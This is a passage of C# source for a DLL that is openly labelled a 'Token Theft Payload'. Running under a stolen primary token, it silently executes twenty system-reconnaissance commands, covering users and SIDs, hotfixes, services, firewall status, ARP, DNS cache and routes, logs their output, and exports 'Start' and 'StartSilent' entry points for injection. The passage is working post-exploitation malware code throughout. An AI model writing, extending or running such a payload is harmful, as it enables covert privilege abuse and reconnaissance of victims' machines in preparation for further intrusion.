                WriteSectionToLog("COMMAND 5: systeminfo", output);

                // COMMAND 6: Running processes
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "tasklist", out output);
                WriteSectionToLog("COMMAND 6: tasklist (Running Processes)", output);

                // COMMAND 7: Network configuration
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "ipconfig /all", out output);
                WriteSectionToLog("COMMAND 7: ipconfig /all", output);

                // COMMAND 8: Active network connections
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "netstat -an", out output);
                WriteSectionToLog("COMMAND 8: netstat -an", output);

                // COMMAND 9: List all drives
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "wmic logicaldisk get name,size,freespace", out output);
                WriteSectionToLog("COMMAND 9: wmic logicaldisk", output);

                // COMMAND 10: Environment variables
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "set", out output);
                WriteSectionToLog("COMMAND 10: set (Environment Variables)", output);

                // COMMAND 11: List all users profiles
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "dir C:\\Users /B", out output);
                WriteSectionToLog("COMMAND 11: dir C:\\Users /B (User Profiles)", output);

                // COMMAND 12: Get all user SIDs
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "wmic useraccount get name,sid", out output);
                WriteSectionToLog("COMMAND 12: wmic useraccount (SIDs)", output);

                // COMMAND 13: Check Windows version
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "ver", out output);
                WriteSectionToLog("COMMAND 13: ver (Windows Version)", output);

                // COMMAND 14: Get installed hotfixes
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "wmic qfe list brief", out output);
                WriteSectionToLog("COMMAND 14: wmic qfe (Hotfixes)", output);

                // COMMAND 15: Check if running as admin
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "whoami /groups | findstr /C:\"S-1-16-12288\"", out output);
                WriteSectionToLog("COMMAND 15: Admin Check", output);

                // COMMAND 16: List all services
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "sc query state= all", out output);
                WriteSectionToLog("COMMAND 16: sc query (Services)", output);

                // COMMAND 17: Get firewall status
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "netsh advfirewall show allprofiles", out output);
                WriteSectionToLog("COMMAND 17: netsh advfirewall", output);

                // COMMAND 18: ARP table
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "arp -a", out output);
                WriteSectionToLog("COMMAND 18: arp -a (ARP Table)", output);

                // COMMAND 19: DNS cache
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "ipconfig /displaydns", out output);
                WriteSectionToLog("COMMAND 19: ipconfig /displaydns", output);

                // COMMAND 20: Routing table
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "route print", out output);
                WriteSectionToLog("COMMAND 20: route print (Routing Table)", output);

                // Cleanup
                ntClose(hPrimaryToken);
                WriteToLog("All commands executed successfully");

                WriteSectionToLog("=== TOKEN THEFT COMPLETED SUCCESSFULLY ===", 
                    $"Log file saved to: {_logPath}");
                
                return 0;
            }
            catch (Exception ex)
            {
                WriteToLog($"Exception in ExecuteTokenTheft: {ex.Message}");
                WriteToLog($"Stack trace: {ex.StackTrace}");
                return 99;
            }
            finally
            {
                WriteToLog("=== Token Theft Payload Finished ===");
            }
        }

        #endregion

        #region Exported Functions

        [UnmanagedCallersOnly(EntryPoint = "Start")]
        public static int Start()
        {
            if (!IsAdmin())
            {
                WriteToLog("ERROR: Not running as administrator!");
                return 1;
            }
            return ExecuteTokenTheft();
        }

        [UnmanagedCallersOnly(EntryPoint = "StartSilent")]
        public static int StartSilent()
        {
            return Start();
        }

        [UnmanagedCallersOnly(EntryPoint = "GetVersion")]
        public static int GetVersion()
        {
            return 3;
        }

        #endregion
    }
}